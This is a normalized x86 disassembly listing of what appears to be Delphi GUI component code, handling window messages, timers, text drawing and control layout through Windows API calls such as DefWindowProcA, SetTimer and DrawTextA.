cmp [ esi + 0x172 ] 0x0
je r-xdata
mov eax esi
call sub_42e340
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax [ esi + 0x174 ]
call [ esi + 0x170 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
sub_42e4b4
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x168 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebx + 0x168 ]
call sub_4209c4
test eax eax
jle r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_4209dc
test eax eax
jle r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esp
mov eax ebx
call sub_42e154
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_4209c4
push eax
mov eax [ ebx + 0x168 ]
call sub_4209dc
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
cmp [ esp ] 0x0
jg r-xdata
mov dl [ ebx + 0x17b ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
cmp [ ebx + 0x17c ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jg r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x48 ]
jl r-xdata
mov eax [ esp + 0xc ]
cmp eax [ ebx + 0x4c ]
jl r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_42e340
test al al
je r-xdata
sub_42e5dc
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
test [ esi + 0x1c ] 0x10
je r-xdata
mov al [ esi + 0x5b ]
test al al
je r-xdata
mov eax [ esi + 0x168 ]
call sub_4209c4
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_4209c4
mov [ edi ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x168 ]
call sub_4209dc
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_4209dc
mov [ ebp ] eax
mov al [ esi + 0x5b ]
sub al 0x3
jae r-xdata
sub_42e644
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449fcc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x168 ] 0x0
mov [ esi + 0x169 ] 0x0
mov edx 0x32
mov eax esi
call sub_441d0c
mov edx 0x32
mov eax esi
call sub_441d30
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42e6e8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x160 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi + 0x10 ]
call sub_41d6c0
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_412edc
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_412edc
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_412edc
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_41dea4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ esi + 0x10 ]
call sub_41d6c0
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_412edc
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_412edc
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_412edc
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_41dea4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e7d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
mov ebx [ edx + 0x160 ]
mov edx eax
mov eax [ ebx + 0x10 ]
call sub_41d6c0
mov ecx edi
mov edx esi
mov eax ebx
call sub_41de78
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_41de18
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_42e818
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x10 ]
call sub_41d7ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x169 ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0xff000014
mov [ ebp - 0xc ] 0xff000010
mov [ ebp - 0x8 ] 0xff000010
mov [ ebp - 0xc ] 0xff000014
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_41d7bc
mov dl 0x4
mov eax [ ebx + 0x10 ]
call sub_41d7a0
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_41d6c0
xor edx edx
mov eax [ ebx + 0x14 ]
call sub_41dae4
mov dl 0x2
mov eax [ ebx + 0x10 ]
call sub_41d7bc
mov dl 0xe
mov eax [ ebx + 0x10 ]
call sub_41d7a0
mov edx 0xffd8ce
mov eax [ ebx + 0x10 ]
call sub_41d6c0
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41dae4
mov eax [ ebp - 0x4 ]
call sub_441f54
push eax
mov eax [ ebp - 0x4 ]
call sub_441f98
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_41dedc
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_42e90a ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x169 ]
cmp eax 0x5
ja r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
xor edx edx
xor eax eax
call sub_412f04
lea eax [ ebp - 0x1c ]
call sub_42e6e8
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
mov edx 0x1
mov eax 0x1
call sub_412f04
lea eax [ ebp - 0x1c ]
call sub_42e6e8
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
sub ecx 0x2
xor edx edx
xor eax eax
call sub_412f04
lea eax [ ebp - 0x1c ]
call sub_42e6e8
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42e7d8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x1
mov ecx 0x1
xor edx edx
mov eax [ ebp - 0xc ]
call sub_42e7d8
pop ecx
jmp r-xdata
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42e7d8
pop ecx
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_42e7d8
pop ecx
jmp r-xdata
push ebp
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42e7d8
pop ecx
push ebp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_42e7d8
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x2
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_42e7d8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_42e7d8
pop ecx
sub_42eaa0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419db0
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42eb28
call sub_41aefc
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42eaf0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42eb9c
mov eax [ esi + 0x34 ]
call sub_41afb0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419dfc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42eb28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42eb62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42eb9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42ec1b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ec22
lea eax [ ebp - 0x4 ]
call sub_404094
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
sub_42ec74
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44aa4c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_436540
call sub_436620
test al al
je r-xdata
add esp 0xfffffff0
call sub_403668
mov edx 0xb9
mov eax esi
call sub_441d0c
mov edx 0x29
mov eax esi
call sub_441d30
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_42f0c4
mov edx 0x1
mov eax esi
call sub_42f0e0
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_4426f0
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_449018
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42ed38
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445c10
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42eda8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44839c
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_446324
sub_42ede8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42eed8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_442550
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_447260
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eedf
lea eax [ ebp - 0x14 ]
call sub_404094
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_448d84
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_448d84
push eax
call InvalidateRect
sub_42eee8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_42ef20
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42f082
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_42e010
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_42eee8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42e010
mov esi [ ebx + 0x208 ]
call sub_436540
call sub_436620
test al al
je r-xdata
push ebp
call sub_42eee8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42e010
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41d9c8
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41dda0
mov eax ebx
call sub_449f84
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_44487c
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_442550
mov eax [ ebp - 0x1c ]
call sub_404554
push eax
mov eax esi
call sub_41e234
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f089
lea eax [ ebp - 0x1c ]
call sub_404094
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41dae4
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_41e130
mov edx r-xdata
mov eax esi
call sub_41e08c
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_42f134
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444df0
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_42f18c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_447a18
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42f2ad
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_447a18
call sub_403b7c
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_441d30
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_441d0c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_42f2c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_4498cc
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_42f2f4
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_449f8c
pop esi
pop ebx
retn
sub_42f498
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_43b710
mov edx edi
mov eax [ esi + 0x210 ]
call sub_414210
xor edx edx
mov eax edi
call sub_442470
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_4426c4
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_42f8c8
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42f51c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_414500
mov edx ebx
and dl 0xfc
mov eax esi
call sub_444bd4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42f554
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_42f5b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ba10
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_42f5be
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46321c
call sub_403b4c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f5e4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_447d68
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403540
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_42f624
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_447bb0
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403540
pop edx
pop esi
pop ebx
retn
sub_42f650
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_439c14
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_42f900
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42f6e0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42f974
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403344
mov eax [ esi + 0x210 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44aaa8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42f730
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41d1e8
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
